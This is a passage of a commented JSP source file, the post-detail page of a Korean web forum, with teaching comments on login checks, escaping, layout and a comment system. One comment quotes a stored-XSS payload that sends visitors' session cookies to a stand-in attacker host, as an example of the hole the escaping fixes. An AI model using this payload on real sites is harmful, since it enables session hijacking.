
<%@page import="Vo.BoardVo"%>
<%@ page language="java" contentType="text/html; charset=UTF-8"
	pageEncoding="UTF-8"%>
 

<%@page import="util.HtmlUtil"%>
<%--
 ============================================================================
  board/read.jsp  -  자유게시판 글 상세 화면 (로그인한 회원만 볼 수 있다)

  CarMain.jsp 의 가운데 영역에 끼워져(include) 보이는 화면 조각이다.
    요청 흐름 : list.jsp 글 제목 클릭 -> /Board/read.bo -> 사장(BoardController)
               -> 조회한 글 정보(vo)를 request 에 담아 -> 이 화면

  화면 구성 (위에서 아래로)
    1. 글 정보          : 작성자·이메일·제목·내용을 읽기 전용으로 보여준다
    2. 비밀번호 확인    : 맞으면 위 입력칸이 열리고 [수정][삭제] 버튼이 나타난다
    3. 댓글 영역        : 무한 대댓글 + 수정·삭제·추천 (전부 자바스크립트가
                          서버와 JSON 으로 주고받으며 화면 이동 없이 처리한다)

  이 화면에 들어오기 전, 사장(BoardController)이 requiresLogin() 으로 이미
  로그인을 요구하므로 정상적인 흐름에서는 아래 [수정 1]의 비로그인 분기에
  걸리지 않는다. 다만 세션 자체가 없는 상태로 주소를 직접 입력해 들어오는
  경우까지 막기 위해 이 화면에서도 한 번 더 확인한다 (다중 방어).
 ============================================================================
--%>
<%
	request.setCharacterEncoding("UTF-8");
	String contextPath = request.getContextPath();

	/*
	 ============================================================================
	   [수정 1] 로그인 확인을 "실제로" 하도록 고쳤다.

	   (기존 코드)   ※ 아래 %\> 는 스크립틀릿 종료 기호다. 왜 이렇게 쓰는지는 [참고] 를 볼 것
	       if(id == null){
	   %\>      <script>alert("로그인 하셔야 합니다."); history.back();</script>
	   <%  }
	       // <- return 이 없어서 아래 HTML이 계속 만들어졌다

	   무엇이 문제였나
	     경고창은 떴지만 글 내용은 이미 응답에 모두 담겨 있었다.
	     - 브라우저에서 "페이지 소스 보기"를 하면 글 내용이 그대로 보였다
	     - 자바스크립트를 끄면 경고창도 뜨지 않고 그냥 읽혔다

	   지금은 return; 으로 응답 생성을 즉시 중단한다.
	   (JSP의 스크립트릿은 서블릿 메소드 안이라 return 을 쓸 수 있다)
	 ============================================================================
	*/
	String id = (String)session.getAttribute("id");
	if(id == null){
%>
		<script>
			alert("로그인이 필요한 기능입니다.");   // 로그인이 필요하다고 알린다
			location.href = "<%=contextPath%>/member/login.me";   // 로그인 화면으로 보낸다
		</script>
<%
		return; //여기서 응답 생성을 끝낸다 - 아래 글 내용은 아예 만들어지지 않는다
	}

	//조회한 글정보 얻기
	BoardVo vo = (BoardVo)request.getAttribute("vo");

	/*
	 [수정 2] 존재하지 않는 글번호 요청 방어

	   /Board/read.bo?b_idx=99999 처럼 없는 글번호를 요청하면 vo가 null이 되고,
	   바로 아래 vo.getB_name() 에서 NullPointerException 500 에러가 났다.
	*/
	if(vo == null){
%>
		<script>
			alert("존재하지 않는 게시글입니다.");   // 없는 글이라고 알린다
			location.href = "<%=contextPath%>/Board/list.bo";   // 글 목록으로 되돌려 보낸다
		</script>
<%
		return;
	}

	/*
	 ============================================================================
	   [수정 3] 저장형 XSS 차단 - 출력할 때 HTML 특수문자를 무해하게 바꾼다.

	   (기존 코드)
	       String title = vo.getB_title();
	       ...
	       <input type="text" value="<%=title%\>">

	   [참고] %\> 라고 적은 이유 - JSP 를 배울 때 꼭 한 번 걸리는 함정

	     JSP 파서는 Java 문법을 모른다.
	     <% 를 만나면 "처음 나오는 스크립틀릿 종료 기호" 에서 무조건 끊는다.
	     Java 주석 안이든 문자열 안이든 상관하지 않는다.

	     그래서 이렇게 주석에 예시 코드를 적을 때 종료 기호를 그대로 쓰면
	     주석 한가운데서 스크립틀릿이 끊기고,
	     닫히지 않은 여는 주석이 남아 화면이 500 에러(JasperException)가 난다.

	     escape 방법 : 퍼센트 뒤에 역슬래시를 넣어 %\> 로 쓴다.
	     JSP 가 번역할 때 역슬래시를 떼고 원래 기호로 되돌려 놓는다.

	   글 제목에 아래를 저장하면?

	       "><script>location.href='http://공격자/?c='+document.cookie</script>

	   value 속성이 끊기면서 script 태그가 실제 코드로 실행된다.
	   그 글을 열어본 모든 사람(관리자 포함)의 세션 쿠키가 공격자에게 전송된다.
	   DB에 저장되어 계속 발동하므로 "저장형(Stored) XSS" 라고 부른다.

	   해결 : 값을 화면에 넣기 전에 < > " ' & 를 엔티티로 바꾼다.
	          (변수에 담는 순간 이스케이프하면, 아래 출력 지점을 하나도 빠뜨리지 않는다)

	   [수정 4] 줄바꿈 처리 버그도 함께 고쳤다.
	       기존 : vo.getB_content().replace("/r/n", "<br>")
	       자바에서 줄바꿈은 "\r\n" 인데 슬래시(/)로 적어 아무 동작도 하지 않았다.
	       또한 내용을 <textarea> 안에 출력하는데, textarea는 줄바꿈을 그대로 표시하므로
	       <br> 로 바꿀 필요가 없다. 그래서 이스케이프만 한다.
	 ============================================================================
	*/
	String name    = HtmlUtil.escape(vo.getB_name());    //조회한 글을 작성한 사람
	String email   = HtmlUtil.escape(vo.getB_email());   //조회한 글을 작성한 사람의 이메일
	String title   = HtmlUtil.escape(vo.getB_title());   //조회한 글제목
	String content = HtmlUtil.escape(vo.getB_content()); //조회한 글 내용

	String b_idx = (String)request.getAttribute("b_idx");
	String nowPage = (String)request.getAttribute("nowPage");
	String nowBlock = (String)request.getAttribute("nowBlock");
%>


	<%-- 게시판 제목: 이미지(board02.gif) → CSS 텍스트 제목으로 대체 --%>
	<%-- 구분선: 이미지(line_870.gif) → CSS 가로선으로 대체 --%>
	<%--
	 ================================================================================
	   [6단계 변경] 표(table) 3중 중첩 레이아웃을 해체했다.

	   (기존 구조)
	     <table width="80%">            <- 화면 폭의 80% 고정
	       <table width="95%">          <- 그 안에 또 표
	         <table width="95%" height="373" cellspacing="1">   <- 또 표
	           <td width="13%" bgcolor="#e4e4e4">작 성 자</td>
	           <td width="34%" bgcolor="#f5f5f5"><input ...></td>

	   무엇이 문제인가
	     1) 표는 "표 형태의 데이터"를 담는 태그다.
	        입력 화면의 배치를 표로 만들면 스크린리더가 "4열 5행 표"로 읽어
	        시각장애인 사용자가 내용을 이해할 수 없다.
	     2) width="13%" 처럼 칸 너비를 고정해서 좁은 화면에서 라벨이
	        "작
	         성
	         자" 처럼 한 글자씩 줄바꿈됐다.
	     3) 색(bgcolor)이 HTML 에 직접 적혀 있어 디자인을 바꾸려면
	        수십 곳을 손으로 고쳐야 했다.

	   (바뀐 구조)
	     <dl class="detail-list">  =  "이름-값 목록"을 뜻하는 표준 태그
	       <dt> 라벨 </dt>  <dd> 값 </dd>

	     app.css 의 .detail-row 가 CSS Grid 로 배치한다.
	       768px 이상 : 라벨 160px + 값     (좌우 2열)
	       768px 미만 : 라벨 위, 값 아래     (위아래 1열)

	     의미(HTML)와 표현(CSS)을 분리했으므로
	     화면 크기가 바뀌어도, 색을 바꿔도 HTML 은 그대로다.
	 ================================================================================
	--%>
	<div class="board-container">

		<h2 class="section-title">자유게시판</h2>

		<%-- 글 정보 : 라벨-값 목록 --%>
		<dl class="detail-list">

			<div class="detail-row">
				<dt>작성자</dt>
				<dd>
					<%-- 조회 화면이므로 입력할 수 없게 disabled 로 둔다 --%>
					<input class="form-control" type="text" name="writer" id="writer"
						   value="<%=name%>" disabled>
				</dd>
			</div>

			<div class="detail-row">
				<dt>이메일</dt>
				<dd>
					<input class="form-control" type="email" name="email" id="email"
						   value="<%=email%>" disabled>
				</dd>
			</div>

			<div class="detail-row">
				<dt>제목</dt>
				<dd>
					<input class="form-control" type="text" name="title" id="title"
						   value="<%=title%>" disabled>
				</dd>
			</div>

			<div class="detail-row">
				<dt>내용</dt>
				<dd>
					<%-- rows/cols 속성 대신 CSS 로 크기를 정한다 (cols 는 글자수 기준이라 반응형에 맞지 않는다) --%>
					<textarea class="form-control" name="content" id="content" disabled><%=content%></textarea>
				</dd>
			</div>

			<div class="detail-row">
				<dt>비밀번호</dt>
				<dd>
					<input class="form-control" type="password" name="pass" id="pass"
						   placeholder="글 작성 시 입력한 비밀번호">
					<%-- 비밀번호 확인 결과와 수정/삭제 결과 메시지가 표시되는 자리 --%>
					<p id="pwInput" class="form-hint"></p>
				</dd>
			</div>

		</dl>

		<%--
		 버튼 영역
		   [변경] 표의 칸(td width="48%"/"10%"/"42%")으로 위치를 잡던 것을
		          flex 로 바꿨다. 좁은 화면에서는 자동으로 줄바꿈된다.

		   [수정][삭제] 는 비밀번호가 맞을 때만 보인다.
		   visibility:hidden 은 자바스크립트가 켜고 끄므로 그대로 둔다.
		   (display:none 이 아니라 visibility 를 쓰는 이유 : 버튼이 사라지면
		    옆 버튼들이 움직여 화면이 덜컹거리기 때문이다)
		--%>
		<div class="flex flex-wrap gap-2 justify-between mt-6">

			<div class="flex flex-wrap gap-2">
				<button type="button" id="update" class="btn btn-primary" style="visibility:hidden;">
					수정
				</button>

				<button type="button" id="delete" class="btn btn-danger" style="visibility:hidden;"
						onclick="deletePro('<%=b_idx%>');">
					삭제
				</button>

				<%--
				 [변경] "답변달기" 버튼을 없애고 아래 댓글 기능으로 대체했다.

				   기존 방식은 답변을 "게시글" 로 저장했다.
				     - 답변을 달 때마다 다른 글들의 b_group 을 전부 +1 하는 UPDATE 를 실행했다
				       (글이 많아지면 답변 한 번에 수천 행이 갱신된다)
				     - 답변도 글이라서 목록의 페이지 수를 차지했다
				       (원글 5건을 보려고 들어왔는데 답변 때문에 원글이 2건만 보였다)
				     - 답변을 읽으려면 화면을 옮겨야 해서 대화 흐름이 끊겼다

				   지금은 이 화면 아래에서 바로 댓글을 읽고 쓴다.
				   깊이 제한 없는 대댓글, 수정·삭제, 추천까지 화면 이동 없이 처리된다.

				   [참고] 공지사항(파일게시판)은 답변 방식을 그대로 둔다.
				          공지는 "관리자 답변" 이 하나의 문서로 남는 편이 자연스럽기 때문이다.
				--%>
			</div>

			<button type="button" id="list" class="btn btn-ghost"
					onclick="location.href='<%=contextPath%>/Board/list.bo?nowBlock=<%=nowBlock%>&nowPage=<%=nowPage%>'">
				목록
			</button>

		</div>

	</div>
	<%-- board-container 끝 --%>

	<%--
	 [중요] 글번호를 담아두는 숨은 칸.

	   원래 이 값은 답변달기 폼(<form id="replyForm">) 안에 있었는데,
	   답변 기능을 없애면서 그 폼을 지웠다.
	   그런데 아래 자바스크립트가 CarApp.val("b_idx") 로 이 값을 읽고 있다.
	       - 글 수정   (updateBoard.do 의 idx)
	       - 비밀번호 확인 (password.do 의 b_idx)
	   폼만 지우고 이 칸을 남기지 않으면 두 기능이 조용히 멈춘다.
	   그래서 폼과 무관하게 여기에 따로 둔다.
	--%>
	<input type="hidden" id="b_idx" value="<%=b_idx%>">

	<%--
	 ================================================================================
	   댓글 영역 (무한 대댓글 + 수정 / 삭제 / 추천)

	   [화면 구성]
	     · 댓글 개수
	     · 댓글 쓰기 입력칸 (로그인한 사람만 보인다)
	     · 댓글 목록  - 아래 자바스크립트가 서버에서 받아 그린다
	                    답글은 depth 만큼 들여쓰기된다

	   [왜 서버가 아니라 자바스크립트가 그리는가]
	     댓글을 하나 쓸 때마다 글 전체를 다시 불러오면 읽던 위치를 잃는다.
	     댓글 영역만 다시 그리면 화면이 그대로 유지된다.

	   [보안] 서버에서 온 값도 전부 이스케이프해서 넣는다.
	          댓글 내용은 다른 사람이 쓴 글이므로 "믿을 수 없는 값" 이다.
	 ================================================================================
	--%>
	<div class="board-container">

		<div class="comment-head">
			<h3 class="comment-title">
				댓글 <span id="commentCount" class="comment-count">0</span>
			</h3>
		</div>

		<%-- 댓글 쓰기 : 이 화면 맨 위에서 비로그인이면 이미 되돌려 보냈으므로(return),
		     여기까지 왔다면 반드시 로그인 상태다. 그래서 따로 검사하지 않는다. --%>
		<div class="comment-form">
			<textarea id="commentInput" class="form-control" rows="3" maxlength="1000"
					  placeholder="댓글을 남겨보세요 (최대 1000자)"></textarea>
			<div class="comment-form-foot">
				<span class="comment-len"><span id="commentLen">0</span> / 1000</span>
				<button type="button" class="btn btn-primary btn-sm" id="commentSubmit">댓글 등록</button>
			</div>
		</div>

		<%-- 댓글 목록이 그려지는 자리 --%>
		<div id="commentList" class="comment-list" aria-live="polite">
			<p class="comment-empty">댓글을 불러오는 중입니다...</p>
		</div>

	</div>
	<%--
	 ================================================================================
	   [5단계 변경] jQuery 제거 - 순수 자바스크립트로 전환

	   (제거된 코드)
	     code.jquery.com 에서 jquery-3.7.1.min.js 를 불러오던 script 태그

	   왜 제거했는가
	     1) 외부 서버(CDN)에 의존해서, 인터넷이 없는 강의실에서는
	        글 수정 / 삭제 / 비밀번호 확인 기능이 전부 멈췄다.

	     2) jQuery 가 한 페이지에 두 번 로드되고 있었다.
	        Top.jsp 가 jquery.slim(가벼운 버전)을 불러오는데,
	        slim 에는 $.ajax 가 없어서 이 파일이 정식 버전을 또 불러왔다.
	        나중에 로드된 jQuery 가 앞의 것을 덮어써서
	        먼저 등록한 이벤트가 사라지는 문제가 생길 수 있는 상태였다.

	   전환 대응표 (수업 자료용)
	     $("#id").val()                    ->  CarApp.val("id")
	     $("#id").text(t).css("color",c)    ->  CarApp.setText("id", t, c)
	     $("#id").html(h).css("color",c)    ->  CarApp.setHtml("id", h, c)
	     $("#id").on("click", fn)           ->  el.addEventListener("click", fn)
	     $.ajax({url,type,data,success})    ->  CarApp.postForm(url, data).then(...)

	   CarApp 은 js/app.js 에 정의된 공용 도우미다. (CarMain.jsp 에서 한 번만 불러온다)
	 ================================================================================
	--%>
	<script>
		//컨텍스트 경로 (요청 주소를 만들 때 사용)
		var ctx = "<%=contextPath%>";

		//수정 입력칸 3개를 한꺼번에 켜고 끄기 위해 목록으로 묶어둔다
		var EDIT_FIELDS = ["email", "title", "content"];

		// ============================================================
		// 0. 본문 높이를 내용에 맞춘다
		// ============================================================
		/*
		  본문은 <textarea> 다. 읽기 전용이지만 비밀번호가 맞으면 이 칸에서 바로
		  수정하기 때문에(EDIT_FIELDS 에 content 포함) 구조를 유지해야 한다.
		  CSS 최소 높이가 160px 이라 긴 글은 잘려 보이므로 내용 높이만큼 늘려준다.
		  (공지사항 fileboardread.jsp 에 같은 처리가 있다 - 자세한 설명은 그쪽 주석)
		*/
		function fitContentHeight(){

			var ta = document.getElementById("content");   // 내용이 들어 있는 textarea 를 찾는다
			if(!ta){ return; }   // 그 칸이 없는 화면이면 아무것도 하지 않는다

			ta.style.height = "auto";                          //먼저 되돌려야 정확히 계산된다
			ta.style.height = (ta.scrollHeight + 4) + "px";     //테두리 여유 4px
		}

		if(document.readyState === "loading"){   // 아직 HTML 을 읽는 중이면
			document.addEventListener("DOMContentLoaded", fitContentHeight);   // 다 읽은 뒤에 실행하도록 예약한다
		}else{
			fitContentHeight();   // 이미 다 읽혔으면 바로 실행한다
		}

		(function(){   // 이 괄호로 감싸 바로 실행한다. 안의 변수가 밖으로 새지 않게 하려는 것이다
			var ta = document.getElementById("content");   // 내용이 들어 있는 textarea 를 찾는다
			if(ta){ ta.addEventListener("input", fitContentHeight); }   //수정 중 줄이 늘어날 때
		})();

		// ============================================================
		// 1. [삭제된 기능] 답변달기
		//    답변(계층형 게시글) 대신 이 화면 아래 댓글 기능을 쓴다.
		//    (이유는 위 버튼 자리의 주석 참고)
		// ============================================================

		// ============================================================
		// 2. 글 삭제  (삭제 버튼의 onclick 에서 호출된다)
		// ============================================================
		function deletePro(b_idx){

			//[확인]을 누르지 않으면 아무 일도 하지 않는다
			if(!window.confirm("정말로 글을 삭제하시겠어요?")){
				return false;
			}

			/* [보안] 글 비밀번호를 함께 보낸다.
			   기존에는 글번호만 보냈고 서버도 검증하지 않아
			   /Board/deleteBoard.do?b_idx=1 주소만 알면 남의 글이 지워졌다. */
			CarApp.postForm(ctx + "/Board/deleteBoard.do", {
				b_idx : b_idx,   // 어느 글을 지울지
				pass  : CarApp.val("pass")
			}).then(function(data){

				if(data === "삭제성공"){   // 서버가 "삭제성공" 이라고 답했으면

					alert("삭제성공");   // 성공을 알린다
					CarApp.setDisabled(EDIT_FIELDS, true);   // 입력칸들을 잠근다 (지워진 글을 더 고칠 수 없게)

					//2초 뒤 [목록] 버튼을 눌러 글목록으로 이동시킨다
					setTimeout(function(){
						document.getElementById("list").click();   // 숨어 있는 [목록] 버튼을 대신 눌러 목록 화면으로 보낸다
					}, 2000);   // 2000밀리초 = 2초 뒤에 실행한다 (알림을 읽을 시간을 준다)

				}else if(data === "비밀번호틀림"){   // 서버가 "비밀번호틀림" 이라고 답했으면
					CarApp.setText("pwInput", "글 비밀번호가 일치하지 않습니다.", "red");   // 비밀번호가 다르다고 빨간 글씨로 안내한다

				}else{
					CarApp.setText("pwInput", "삭제실패!", "red");   // 그 밖의 실패면 실패했다고만 알린다
					CarApp.setDisabled(EDIT_FIELDS, false);   // 입력칸을 다시 열어 준다 (고쳐서 다시 시도할 수 있게)
				}

			}).catch(function(err){   // 통신 자체가 실패한 경우
				alert("삭제 요청 실패 : " + err.message);   // 실패 이유를 알린다
			});
		}

		// ============================================================
		// 3. 글 수정
		// ============================================================
		document.getElementById("update").addEventListener("click", function(){

			CarApp.postForm(ctx + "/Board/updateBoard.do", {   // 글 수정 주소로 값을 보낸다
				email   : CarApp.val("email"),   // 수정한 이메일
				title   : CarApp.val("title"),
				content : CarApp.val("content"),
				idx     : CarApp.val("b_idx"),
				//[보안] 수정도 서버에서 비밀번호를 다시 검증한다
				pass    : CarApp.val("pass")
			}).then(function(data){

				if(data === "수정성공"){   // 서버가 "수정성공" 이라고 답했으면
					CarApp.setHtml("pwInput", "<strong>수정성공</strong>", "green");   // 성공을 초록 글씨로 안내한다
					CarApp.setDisabled(EDIT_FIELDS, true);   // 입력칸들을 잠근다 (같은 내용을 또 보내지 않게)

				}else if(data === "비밀번호틀림"){   // 서버가 "비밀번호틀림" 이라고 답했으면
					CarApp.setHtml("pwInput", "<strong>글 비밀번호가 일치하지 않습니다.</strong>", "red");   // 비밀번호가 다르다고 빨간 글씨로 안내한다

				}else{
					CarApp.setHtml("pwInput", "<strong>수정 실패</strong>", "red");   // 그 밖의 실패면 실패했다고만 알린다
					CarApp.setDisabled(EDIT_FIELDS, false);   // 입력칸을 다시 열어 준다
				}

			}).catch(function(err){   // 통신 자체가 실패한 경우
				alert("수정 요청 실패 : " + err.message);   // 실패 이유를 알린다
			});
		});

		// ============================================================
		// 4. 글 비밀번호를 입력하고 입력칸을 벗어났을 때 서버에 확인 요청
		//
		//    맞으면 수정 입력칸과 [수정][삭제] 버튼을 활성화한다.
		//
		//    [중요] 이것은 "편의 기능"이지 보안 장치가 아니다.
		//           버튼을 숨겨도 주소로 직접 요청할 수 있기 때문에
		//           서버(BoardService)가 수정/삭제 시점에 비밀번호를 다시 검증한다.
		//           화면에서 하는 검사는 안내, 보안은 서버에서.
		// ============================================================
		document.getElementById("pass").addEventListener("focusout", function(){

			var pass = CarApp.val("pass");   // 입력한 글 비밀번호를 읽는다

			//빈 값으로는 서버를 부르지 않는다 (불필요한 요청 방지)
			if(pass === ""){ return; }

			CarApp.postForm(ctx + "/Board/password.do", {
				b_idx : CarApp.val("b_idx"),   // 어느 글의 비밀번호인지
				pass  : pass
			}).then(function(data){

				//서버는 "비밀번호 맞음" 또는 "비밀번호 틀림" 을 보낸다
				var ok = (data === "비밀번호 맞음");

				CarApp.setText("pwInput",   // 결과를 안내 문구로 띄운다
					ok ? "글의 비밀번호가 일치합니다." : "글의 비밀번호가 다릅니다",
					ok ? "green" : "red");

				CarApp.setDisabled(EDIT_FIELDS, !ok);   // 맞으면 입력칸을 열고, 틀리면 잠근다.  ! 는 "반대" 라는 뜻이다
				CarApp.setVisible(["update", "delete"], ok);   // 맞을 때만 수정·삭제 버튼을 보여 준다

			}).catch(function(err){   // 통신 자체가 실패한 경우
				alert("비밀번호 확인 실패 : " + err.message);   // 실패 이유를 알린다
			});
		});

		/* ============================================================
		   6. 댓글 (무한 대댓글 + 수정 / 삭제 / 추천)

		   [서버와 주고받는 주소]
		     POST /Board/commentList.do    b_idx            -> 목록(JSON)
		     POST /Board/commentAdd.do     b_idx, parent_idx, content
		     POST /Board/commentEdit.do    c_idx, content
		     POST /Board/commentDelete.do  c_idx
		     POST /Board/commentLike.do    c_idx            -> 추천 토글

		   CarApp.postForm 이 CSRF 토큰을 자동으로 붙여준다. (js/app.js)
		   ============================================================ */

		/* [버그 수정] 여기서 CarApp.val("b_idx") 를 쓰면 안 된다.

		     js/app.js 는 CarMain.jsp 의 head 에서 defer 로 불러온다.
		     defer 스크립트는 "HTML 을 다 읽은 뒤" 실행되는데,
		     이 인라인 스크립트는 HTML 을 읽는 중에 바로 실행된다.

		         head 의 app.js (defer)  -> 나중에 실행
		         body 의 인라인 스크립트  -> 먼저 실행

		     [주의] 이 주석에 스크립트 종료 태그를 그대로 적으면 안 된다.
		            브라우저는 자바스크립트 주석을 모르고 그 태그에서 스크립트를 끊어버려
		            아래 코드 전체가 죽는다. (JSP 주석의 %\> 함정과 같은 원리)

		     그래서 이 시점에는 CarApp 이 아직 없다(undefined).
		     CarApp.val(...) 을 부르면 TypeError 가 나고,
		     그 아래 줄부터 실행이 멈춰 댓글이 하나도 그려지지 않았다.
		     (함수 선언은 호이스팅되어 정의는 남으므로 "함수는 있는데 목록이 비는" 상태가 된다)

		   해결 : 값 읽기는 브라우저 기본 API 로 한다 (CarApp 이 필요 없다).
		          CarApp 을 쓰는 첫 호출은 아래 DOMContentLoaded 안으로 미룬다. */
		var BOARD_IDX = document.getElementById("b_idx").value;

		/* [보안] 댓글은 "다른 사람이 쓴 글" 이다.
		   innerHTML 에 넣기 전에 반드시 이스케이프한다.
		   (블록 주석 안에 정규식을 쓰면 주석이 끊기므로 이 설명은 줄 주석으로 두었다) */
		function cEsc(text){
			return String(text == null ? "" : text)   // null 이 와도 오류가 안 나게 빈 문자열로 바꿔 두고 시작한다
				.replace(/&/g, "&amp;")
				.replace(/</g, "&lt;")
				.replace(/>/g, "&gt;")
				.replace(/"/g, "&quot;")
				.replace(/'/g, "&#39;");
		}

		// 줄바꿈만 <br> 로 살린다 (이스케이프를 먼저 한 뒤에 해야 의미가 있다)
		function cText(text){
			return cEsc(text).replace(/\r\n|\r|\n/g, "<br>");   // 먼저 무해하게 바꾼 뒤, 줄바꿈만 <br> 로 되살린다. 순서를 지켜야 안전하다
		}

		// ----- 댓글 목록 불러와 그리기 -----
		function loadComments(){

			CarApp.postForm(ctx + "/Board/commentList.do", { b_idx : BOARD_IDX })   // 이 글의 댓글 목록을 서버에 요청한다
				.then(function(text){
					var data = JSON.parse(text);   // 받은 글자를 JSON 객체로 바꾼다
					if(!data.ok){   // 서버가 실패라고 답했으면
						document.getElementById("commentList").innerHTML =   // 댓글 자리에 오류 안내를 넣는다
							'<p class="comment-empty">' + cEsc(data.message) + '</p>';
						return;   // 여기서 끝낸다
					}
					renderComments(data.comments, data.loggedIn);   // 받은 댓글 목록을 화면에 그린다
					document.getElementById("commentCount").textContent = data.count;   // 댓글 개수를 화면에 표시한다
				})
				.catch(function(err){   // 통신 자체가 실패한 경우
					document.getElementById("commentList").innerHTML =   // 댓글 자리에 오류 안내를 넣는다
						'<p class="comment-empty">댓글을 불러오지 못했습니다. (' + cEsc(err.message) + ')</p>';
				});
		}

		function renderComments(list, loggedIn){   // 받은 댓글 목록으로 실제 화면을 그리는 함수

			var box = document.getElementById("commentList");   // 댓글이 들어갈 자리를 찾는다

			if(!list || list.length === 0){   // 댓글이 하나도 없으면
				box.innerHTML = '<p class="comment-empty">첫 댓글을 남겨보세요.</p>';   // 첫 댓글을 권하는 안내를 넣는다
				return;   // 여기서 끝낸다
			}

			var html = "";   // 만들 HTML 을 담을 빈 글자

			for(var i = 0; i < list.length; i++){   // 댓글을 하나씩 처리한다 (서버가 이미 보여줄 순서대로 정렬해 보냈다)

				var c = list[i];   // 이번에 그릴 댓글 하나

				// 숫자는 Number() 로 강제해 이상한 값이 끼어들지 못하게 한다
				var cIdx  = Number(c.cIdx) || 0;
				var depth = Number(c.depth) || 0;   // 들여쓰기 단계. 숫자로 바꾸고 실패하면 0
				var likes = Number(c.likeCount) || 0;   // 추천 수. 숫자로 바꾸고 실패하면 0

				// 들여쓰기는 CSS 변수로 넘긴다 (style 문자열을 조립하지 않는다)
				html += '<div class="comment-item" data-depth="' + depth + '" id="c-' + cIdx + '">';

				if(depth > 0){   // 답글이면(깊이가 0보다 크면)
					html += '<span class="comment-arrow" aria-hidden="true">&#8627;</span>';   // 꺾인 화살표를 앞에 붙여 답글임을 표시한다
				}

				html += '<div class="comment-body">';   // 댓글 내용이 들어갈 상자를 연다

				// --- 삭제된 댓글 : 뼈대만 보여준다 (답글이 있어 자리를 남긴 경우) ---
				if(c.deleted){
					html += '<p class="comment-deleted">삭제된 댓글입니다.</p>';
					html += '</div></div>';
					continue;
				}

				// --- 머리글 : 이름 / 날짜 / (수정됨) ---
				html += '<div class="comment-meta">'
					 +    '<b class="comment-name">' + cEsc(c.name) + '</b>'
					 +    '<span class="comment-date">' + cEsc(c.date) + '</span>'
					 +    (c.edited ? '<span class="comment-edited">(수정됨)</span>' : '')
					 + '</div>';

				// --- 내용 ---
				html += '<p class="comment-content" id="cc-' + cIdx + '">' + cText(c.content) + '</p>';

				// --- 버튼줄 : 추천 / 답글 / 수정 / 삭제 ---
				html += '<div class="comment-actions">';

				// 추천 : 내가 이미 추천했으면 색이 채워진다. 내 댓글은 추천 버튼을 숨긴다.
				if(!c.mine){
					html += '<button type="button" class="comment-like' + (c.likedByMe ? ' is-liked' : '') + '"'
						 +  ' onclick="toggleLike(' + cIdx + ')">'
						 +  '&#128077; <span id="cl-' + cIdx + '">' + likes + '</span></button>';
				}else{
					// 내 댓글은 추천할 수 없으므로 숫자만 보여준다
					html += '<span class="comment-like is-static">&#128077; '
						 +  '<span id="cl-' + cIdx + '">' + likes + '</span></span>';
				}

				if(loggedIn){   // 로그인한 사람에게만
					html += '<button type="button" class="comment-btn" onclick="showReply(' + cIdx + ')">답글</button>';   // 답글 버튼을 보여 준다
				}
				if(c.mine){   // 내가 쓴 댓글이면
					html += '<button type="button" class="comment-btn" onclick="showEdit(' + cIdx + ')">수정</button>'   // 수정·삭제 버튼도 함께 보여 준다
						 +  '<button type="button" class="comment-btn comment-btn-danger" onclick="removeComment(' + cIdx + ')">삭제</button>';
				}

				html += '</div>';           // comment-actions
				html += '<div class="comment-slot" id="cs-' + cIdx + '"></div>';  // 답글/수정 입력칸이 열리는 자리
				html += '</div></div>';     // comment-body, comment-item
			}

			box.innerHTML = html;   // 조립한 HTML 을 한 번에 넣는다. 한 줄씩 넣는 것보다 훨씬 빠르다
		}

		// ----- 댓글 등록 -----
		function addComment(parentIdx, content, slotId){

			if(!content || content.trim() === ""){   // 내용이 비어 있거나 공백뿐이면
				alert("내용을 입력해주세요.");   // 입력해 달라고 알린다
				return;   // 여기서 끝낸다
			}

			var data = { b_idx : BOARD_IDX, content : content };   // 보낼 값들을 담는다
			if(parentIdx){ data.parent_idx = parentIdx; }   // 답글이면 부모 댓글번호도 함께 담는다

			CarApp.postForm(ctx + "/Board/commentAdd.do", data)   // 댓글 등록 주소로 보낸다
				.then(function(text){
					var res = JSON.parse(text);   // 받은 글자를 JSON 객체로 바꾼다
					if(!res.ok){ alert(res.message); return; }   // 서버가 실패라고 답했으면 이유를 알리고 끝낸다

					// 입력칸 정리 후 목록을 다시 그린다
					if(slotId){
						document.getElementById(slotId).innerHTML = "";
					}else{
						document.getElementById("commentInput").value = "";   // 입력칸을 비운다
						document.getElementById("commentLen").textContent = "0";   // 글자 수 표시도 0 으로 되돌린다
					}
					loadComments();   // 목록을 다시 불러와 방금 쓴 댓글이 보이게 한다
				})
				.catch(function(err){ alert("등록 실패 : " + err.message); });   // 통신 자체가 실패하면 이유를 알린다
		}

		// ----- 답글 입력칸 열기 -----
		function showReply(cIdx){

			var slot = document.getElementById("cs-" + cIdx);   // 그 댓글 아래에 입력칸이 열릴 자리를 찾는다

			// 이미 열려 있으면 닫는다 (같은 버튼으로 토글)
			if(slot.innerHTML !== ""){ slot.innerHTML = ""; return; }

			slot.innerHTML =
				'<div class="comment-form comment-form-sm">'
			  +   '<textarea class="form-control" rows="2" maxlength="1000" id="rp-' + cIdx + '"'
			  +             ' placeholder="답글을 입력하세요"></textarea>'
			  +   '<div class="comment-form-foot">'
			  +     '<button type="button" class="btn btn-ghost btn-sm" onclick="closeSlot(' + cIdx + ')">취소</button>'
			  +     '<button type="button" class="btn btn-primary btn-sm" onclick="submitReply(' + cIdx + ')">답글 등록</button>'
			  +   '</div>'
			  + '</div>';

			document.getElementById("rp-" + cIdx).focus();   // 새로 만든 입력칸에 커서를 놓아 준다
		}

		function submitReply(cIdx){   // 답글 등록 버튼이 부르는 함수
			addComment(cIdx, document.getElementById("rp-" + cIdx).value, "cs-" + cIdx);   // 입력한 내용을 부모 댓글번호와 함께 넘긴다
		}

		function closeSlot(cIdx){   // 답글·수정 입력칸을 닫는 함수
			document.getElementById("cs-" + cIdx).innerHTML = "";   // 그 자리를 비우면 입력칸이 사라진다
		}

		// ----- 수정 입력칸 열기 -----
		function showEdit(cIdx){

			var slot = document.getElementById("cs-" + cIdx);   // 그 댓글 아래에 입력칸이 열릴 자리를 찾는다
			if(slot.innerHTML !== ""){ slot.innerHTML = ""; return; }   // 이미 열려 있으면 닫고 끝낸다 (같은 버튼으로 열고 닫기)

			// 지금 화면에 있는 내용을 그대로 가져온다.
			// <br> 로 바꿔둔 줄바꿈을 다시 개행으로 되돌린다.
			var current = document.getElementById("cc-" + cIdx).innerHTML
							.replace(/<br\s*\/?>/gi, "\n");
			// 화면에 있던 HTML 엔티티를 원래 글자로 되돌린다 (textarea 는 글자를 그대로 담는다)
			var tmp = document.createElement("textarea");
